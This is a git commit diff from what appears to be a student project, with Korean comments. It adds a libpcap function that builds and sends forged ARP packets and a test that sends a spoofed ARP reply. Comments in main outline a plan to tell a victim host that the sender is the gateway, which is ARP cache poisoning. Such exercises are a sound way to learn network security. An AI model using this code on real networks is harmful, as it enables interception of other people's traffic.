cb9a04a3448c841b72ec0a14119cfd5c8ffbb832
kangsangsoo <rkdtkdtn0706@korea.ac.kr>
2021-09-24 21:04:21 +0900

    sendARP success

--- main.cpp
+++ main.cpp
@@ -8,8 +8,7 @@
 
 #define SUCCESS 1
 #define FAIL -1
-#define REQUEST 1
-#define REPLY -1
+
 #pragma pack(push, 1) // 구조체 패딩 비트에 대한 내용. pop 나올 때 까지 패딩을 없애겠단 뜻
 struct EthArpPacket final {
 	EthHdr eth_;
@@ -51,22 +50,60 @@ void getMyMac(Mac& mac, string& dev) {
 	fin.close();
 }
 
-int sendARP(Mac& smac1, Mac& dmac, Mac& smac2, Ip& sip, Mac& tmac, Ip& dip, int TYPE) {
-	// TYPE == 1 : Request
-	// TYPE == -1: Reply
+int sendARP(Mac& smac1, Mac& dmac, Mac& smac2, Ip& sip, Mac& tmac, Ip& tip, uint16_t type, pcap_t* handle) {
+	// TYPE에는 ArpHdr::Request : Request
+	// TYPE에는 ArpHdr::Reply   : Reply
 
 	// 패킷 구성
-	// ...
-	
+	EthArpPacket packet;
+
+	packet.eth_.dmac_ = dmac;
+	packet.eth_.smac_ = smac1;
+
+	packet.eth_.type_ = htons(EthHdr::Arp);
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet.arp_.pro_ = htons(EthHdr::Ip4);
+	packet.arp_.hln_ = Mac::SIZE;
+	packet.arp_.pln_ = Ip::SIZE;
+
+	packet.arp_.op_ = htons(type);
+
+	packet.arp_.smac_ = smac2;
+	packet.arp_.sip_ = htonl(sip);
+	packet.arp_.tmac_ = tmac;
+	packet.arp_.tip_ = htonl(tip);
+
 	// 전송
+	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		return FAIL;
+	}
+	return SUCCESS;
+}
+
+void initArg(int argc, char* argv[]) {
 
 }
 
 
 void test(void) {
 	Mac mac;
-	string dev = "enp0s3";
-	getMyMac(mac, dev);
+	char* dev = "enp0s3";
+	string dev_= dev;
+	getMyMac(mac, dev_);
+	
+	Mac smac1 = Mac("08:00:27:2b:b1:96");
+	Mac dmac = Mac("92:dd:52:5c:ee:81");
+
+	Mac smac2 = Mac("08:00:27:2b:b1:96");
+	Ip sip = Ip("192.168.0.13");
+	Mac tmac = Mac("92:dd:52:5c:ee:81");
+	Ip tip = Ip("192.168.0.7");
+
+	char errbuf[PCAP_ERRBUF_SIZE];
+	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+	sendARP(smac1, dmac, smac2, sip, tmac, tip, ArpHdr::Reply, handle);
 }
 
 int main(int argc, char* argv[]) {
@@ -89,7 +126,9 @@ int main(int argc, char* argv[]) {
 
 
 	// 1. 본인 맥, 얻기 ; IP는 몰라도 괜찮음 왜냐하면 패킷은 어차피 맥 타고 오니까?
+	// 여기까진 성공
 	// 2. ARP Request / Reply로 victim, gateway 알아오기
+	// 
 	// 3. victim에게 본인이 gateway임을 알리는 Reply 보내기
 
 	EthArpPacket packet;
